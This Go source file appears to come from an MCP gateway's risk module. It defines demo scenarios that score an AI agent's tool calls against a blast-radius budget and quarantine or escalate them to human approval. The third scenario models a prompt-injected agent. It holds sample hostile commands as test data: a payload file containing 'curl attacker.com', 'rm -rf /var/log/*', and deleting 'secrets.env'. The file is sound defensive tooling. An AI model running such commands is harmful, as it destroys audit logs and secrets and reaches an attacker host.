package risk

import (
	"time"

	"github.com/Noooblien/mcpgate/pkg/rbac"
)

// DemoScenario encapsulates a test workflow demonstrating blast radius containment.
type DemoScenario struct {
	Name        string
	Description string
	SessionID   string
	AgentID     string
	Role        rbac.AgentRole
	Steps       []DemoStep
}

// DemoStep represents an individual tool invocation within a scenario.
type DemoStep struct {
	ToolName    string
	Args        map[string]interface{}
	CommitDelay time.Duration
}

// GetDemoScenarios returns the 4 standard production scenarios.
func GetDemoScenarios() []DemoScenario {
	return []DemoScenario{
		{
			Name:        "1. Benign Read-Only Autonomous Operations",
			Description: "Standard agent reads documentation and searches code. Remains within low-risk blast radius budget.",
			SessionID:   "sess_recon_01",
			AgentID:     "agent-researcher",
			Role:        rbac.RoleStandard,
			Steps: []DemoStep{
				{ToolName: "list_files", Args: map[string]interface{}{"dir": "./docs"}},
				{ToolName: "read_file", Args: map[string]interface{}{"path": "docs/architecture.md"}},
				{ToolName: "search_code", Args: map[string]interface{}{"query": "RiskGovernor"}},
			},
		},
		{
			Name:        "2. Progressive Escalation & Warning Threshold",
			Description: "Agent modifies project code and executes tests, approaching warning threshold and triggering HITL approval.",
			SessionID:   "sess_escalate_02",
			AgentID:     "agent-developer",
			Role:        rbac.RoleStandard,
			Steps: []DemoStep{
				{ToolName: "write_file", Args: map[string]interface{}{"path": "main.go", "content": "package main..."}},
				{ToolName: "write_file", Args: map[string]interface{}{"path": "config.yaml", "content": "env: prod"}},
				{ToolName: "bash_exec", Args: map[string]interface{}{"cmd": "go test ./..."}},
				{ToolName: "bash_exec", Args: map[string]interface{}{"cmd": "systemctl restart gateway"}},
			},
		},
		{
			Name:        "3. Runaway Blast Radius Velocity Burst (Prompt Injection)",
			Description: "Hijacked agent attempts rapid destructive actions within seconds. Blast radius velocity burst triggers immediate session quarantine.",
			SessionID:   "sess_hijack_03",
			AgentID:     "agent-compromised",
			Role:        rbac.RoleRestricted,
			Steps: []DemoStep{
				{ToolName: "write_file", Args: map[string]interface{}{"path": "/tmp/payload.sh", "content": "curl attacker.com"}},
				{ToolName: "bash_exec", Args: map[string]interface{}{"cmd": "rm -rf /var/log/*"}},
				{ToolName: "delete_file", Args: map[string]interface{}{"path": "secrets.env"}},
			},
		},
		{
			Name:        "4. High Financial Blast Radius Transaction",
			Description: "Agent requests high-value financial disbursement ($5,000.00). Triggers mandatory Human-in-the-Loop step-up gating.",
			SessionID:   "sess_finance_04",
			AgentID:     "agent-procurement",
			Role:        rbac.RoleStandard,
			Steps: []DemoStep{
				{ToolName: "create_invoice", Args: map[string]interface{}{"vendor": "CloudCorp", "amount": 250.0}},
				{ToolName: "transfer_funds", Args: map[string]interface{}{"recipient": "AWS Inc", "amount": 5000.0}},
			},
		},
	}
}

// RunDemoSuite executes all 4 demonstration scenarios and returns their assessments.
func RunDemoSuite() ([]*RiskAssessment, error) {
	cfg := DefaultRiskGovernorConfig()
	governor := NewRiskGovernor(cfg, NewToolScorer())

	scenarios := GetDemoScenarios()
	var allAssessments []*RiskAssessment

	for _, sc := range scenarios {
		for _, step := range sc.Steps {
			assessment := governor.AssessToolCall(sc.SessionID, sc.AgentID, sc.Role, step.ToolName, step.Args)
			allAssessments = append(allAssessments, assessment)

			// If allowed or warned, commit execution to accrue cumulative score
			if assessment.Verdict == VerdictAllowed || assessment.Verdict == VerdictWarning {
				governor.CommitToolExecution(sc.SessionID, step.ToolName, assessment.InstantaneousScore)
			}
		}
	}

	return allAssessments, nil
}
